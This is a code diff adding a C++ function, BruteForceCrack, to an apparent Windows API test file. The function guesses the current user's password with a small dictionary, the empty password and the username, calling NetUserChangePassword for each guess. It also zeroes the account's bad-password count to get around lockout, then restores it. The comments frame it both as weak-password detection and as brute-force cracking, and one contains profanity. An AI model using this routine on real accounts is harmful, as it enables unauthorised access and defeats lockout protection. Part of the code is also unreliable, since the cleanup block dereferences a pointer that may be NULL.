@@ -131,3 +131,88 @@ void TestConvertStringSidToSid()
 
     LocalFree(pIntegritySid);
 }
+
+
+void BruteForceCrack()
+/*
+获取操作系统的用户的密码的正规方式是编译一个DLL，然后修改注册表，等登录的时候自动的拦截到，不过这个需要权限的限制。
+
+在防御的方面说，这是弱密码检测。
+在攻击的方面说，这是暴力破解。
+*/
+{
+    LPCWSTR password[] = {//弱密码字典，可以有成千上万条。
+        L"",
+        L"123456",
+        L"1qaz2wsx",
+        L"!QAZ@WSX",
+        L"qwer",
+        L"password",
+        L"123456789",
+        L"123123",
+        L"correy" //正确的密码。
+    };
+
+    WCHAR UserName[UNLEN + 1]{};
+    DWORD Size{_ARRAYSIZE(UserName)};
+    GetUserName(UserName, &Size);
+    printf("正在尝试获取当前用户(%ls)的密码。\n", UserName);
+
+    LPUSER_INFO_2 UserInfo2 = NULL;
+    USER_INFO_2 Tmp = {0};
+    DWORD parm_err = 0;
+    NET_API_STATUS nStatus = NERR_Success;
+    DWORD dwRet = NERR_Success;
+
+    __try {//警告：看看编译器的奇特：如果没有__try及__leave，在中间声明变量也会编译出错。
+        nStatus = NetUserGetInfo(NULL, UserName, 2, (LPBYTE *)&UserInfo2);
+        if (nStatus != NERR_Success) {
+
+            __leave;
+        }
+
+        /*账户设置为永不锁定*/
+        memcpy_s(&Tmp, sizeof(USER_INFO_2), UserInfo2, sizeof(USER_INFO_2));
+        Tmp.usri2_bad_pw_count = 0;
+        nStatus = NetUserSetInfo(NULL, UserName, 2, (LPBYTE)&Tmp, &parm_err);
+        if (nStatus != NERR_Success) {
+
+            __leave;
+        }
+
+        dwRet = NetUserChangePassword(NULL, UserName, L"", L"");
+        if (NERR_Success == dwRet || NERR_PasswordTooShort == dwRet) {
+            printf("密码为空\n");
+            __leave;
+        }
+
+        /* 检测账号密码相同账户 *///日她娘的，这个注释如果删除了，编译会出现：error C2059: 语法错误:“}”
+        dwRet = NetUserChangePassword(NULL, UserName, UserName, UserName);
+        if (NERR_Success == dwRet || NERR_PasswordTooShort == dwRet) {
+            printf("密码和用户相同\n");
+            __leave;
+        }
+
+        for (int i = 0; i < _ARRAYSIZE(password); i++) {
+            dwRet = NetUserChangePassword(NULL, UserName, password[i], password[i]);
+            if (NERR_Success == dwRet || NERR_PasswordTooShort == dwRet) {
+                printf("UserName:%ls, Password:%ls\n", UserName, password[i]);
+                break;
+            } else if (ERROR_ACCOUNT_LOCKED_OUT == dwRet) {
+                break;
+            }
+        }
+    } __finally {
+        /*还原用户配置*/
+        memcpy_s(&Tmp, sizeof(USER_INFO_2), UserInfo2, sizeof(USER_INFO_2));
+        Tmp.usri2_bad_pw_count = UserInfo2->usri2_bad_pw_count;
+        nStatus = NetUserSetInfo(NULL, UserName, 2, (LPBYTE)&Tmp, &parm_err);
+        if (nStatus != NERR_Success) {
+
+        }
+
+        if (UserInfo2) {
+            NetApiBufferFree(UserInfo2);
+        }
+    }
+}
